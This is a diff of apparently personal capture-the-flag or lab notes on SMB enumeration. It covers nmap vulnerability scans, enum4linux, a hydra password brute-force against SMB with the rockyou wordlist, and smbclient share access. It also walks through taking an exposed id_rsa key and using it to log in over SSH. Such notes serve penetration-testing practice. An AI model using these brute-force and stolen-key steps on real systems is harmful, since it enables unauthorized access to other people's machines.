@@ -8,13 +8,25 @@ SMB Emumeration
 Tips:- nmap -p 445,139 --open -sV subnet
 :-enum4linux -a Ip
 :- hydra -l student -P /usr/share/wordlists/rockyou.txt smb://192.168.1.10
-:-smbclient \\\\ip\\share -U student(widnows style will not work for linux)
-:- smbclient //ip/share -U student
+:-smbclient \\\\ip\\share -U username(widnows style will not work for linux)
+:- smbclient //ip/sharename -U username
 smb: \> ls
   flag.enc
 smb: \> get flag.enc
 smb: \> exit
 :- file flag.enc( to identify encryption type)
+SMB Enumeration
+sudo nmap -A –p 445 192.168.18.110
+sudo nmap -sS -T4  --script vuln 192.168.18.110
+>sudo nmap --script smb-os-discovery.nse 192.168.18.110
+>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.18.110
+Smbclient  //10.10.10.10/share-U username
+If .ssh file is there when we do ls
+Then cd .ssh
+ls, we found id_rsa
+We have to make chmod 600 id_rsa to make it work. 
+Ssh -i id_rsa username@10.10.10.10
+Ls, the we can find txt file there
 
 #File & Hash Extraction
 
